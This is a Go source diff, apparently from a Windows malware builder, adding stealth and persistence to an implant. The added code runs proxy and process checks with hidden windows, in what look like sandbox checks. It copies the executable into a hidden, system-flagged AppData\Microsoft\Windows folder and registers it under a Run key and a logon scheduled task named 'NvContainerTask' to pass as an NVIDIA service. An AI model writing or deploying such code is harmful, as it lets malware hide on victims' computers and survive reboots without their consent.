@@ -247,7 +247,9 @@ func hasProxyConfigured() bool {
 	}
 
 	cmd := exec.Command("netsh", "winhttp", "show", "proxy")
+	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 	out, err := cmd.Output()
+
 	if err == nil {
 		text := strings.ToLower(string(out))
 		if strings.Contains(text, "proxy server"); text != "" && !strings.Contains(text, "direct access") {
@@ -265,13 +267,107 @@ func checkFileExists(pattern string) bool {
 
 func checkProcessRunning(processName string) bool {
 	cmd := exec.Command("tasklist", "/FI", fmt.Sprintf("IMAGENAME eq %s", processName), "/NH")
+	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 	output, err := cmd.Output()
+
 	if err != nil {
 		return false
 	}
 	return strings.Contains(string(output), processName)
 }
 
-func setupLogger() *os.File { return nil }
-`, delay, buildID, buildID))
+func ensureNormalInstall() bool {
+	if runtime.GOOS != "windows" {
+		return false
+	}
+
+	exePath, err := os.Executable()
+	if err != nil {
+		return false
+	}
+
+	appData := os.Getenv(getAppDataEnvName())
+	if appData == "" {
+		return false
+	}
+
+	targetDir := filepath.Join(appData, getMicrosoftDirName(), getWindowsDirName())
+	targetExe := filepath.Join(targetDir, getServiceExeName())
+
+	// If already running from installed location, continue normally
+	if exePath == targetExe {
+		return false
+	}
+
+	// Check if already installed
+	if _, err := os.Stat(targetExe); err == nil {
+		// Launch the installed version and exit
+		cmd := exec.Command(targetExe)
+		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+		_ = cmd.Start()
+		return true
+	}
+
+	// First time install: drop & hide
+	if err := os.MkdirAll(targetDir, 0755); err != nil {
+		return false
+	}
+
+	// Copy self
+	if err := copyFile(exePath, targetExe); err != nil {
+		return false
+	}
+
+	// Hide files: set hidden + system attributes
+	if err := windows.SetFileAttributes(windows.StringToUTF16Ptr(targetExe), windows.FILE_ATTRIBUTE_HIDDEN|windows.FILE_ATTRIBUTE_SYSTEM); err != nil {
+		// Ignore error
+	}
+	if err := windows.SetFileAttributes(windows.StringToUTF16Ptr(targetDir), windows.FILE_ATTRIBUTE_HIDDEN|windows.FILE_ATTRIBUTE_SYSTEM); err != nil {
+		// Ignore error
+	}
+
+	// Set HKCU Run key for persistence
+	regCmd := fmt.Sprintf("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v \"NvContainerTask\" /t REG_SZ /d \"%s\" /f", targetExe)
+	cmd := cmdHidden("cmd", "/C", regCmd)
+	_ = cmd.Run()
+
+	// Create user-level scheduled task
+	taskCmd := fmt.Sprintf("schtasks /create /sc onlogon /tn \"NvContainerTask\" /tr \"%s\" /ru %s /f", targetExe, os.Getenv("USERNAME"))
+	cmd = cmdHidden("cmd", "/C", taskCmd)
+	_ = cmd.Run()
+
+	// Launch the installed version and exit
+	cmd = exec.Command(targetExe)
+	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+	_ = cmd.Start()
+	return true
 }
+
+func cmdHidden(name string, arg ...string) *exec.Cmd {
+	cmd := exec.Command(name, arg...)
+	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+	return cmd
+}
+
+func copyFile(src, dst string) error {
+	sourceFile, err := os.Open(src)
+	if err != nil {
+		return err
+	}
+	defer sourceFile.Close()
+
+	destFile, err := os.Create(dst)
+	if err != nil {
+		return err
+	}
+	defer destFile.Close()
+
+	_, err = io.Copy(destFile, sourceFile)
+	if err != nil {
+		return err
+	}
+
+	return destFile.Sync()
+}
+
+func setupLogger() *os.File { return nil }
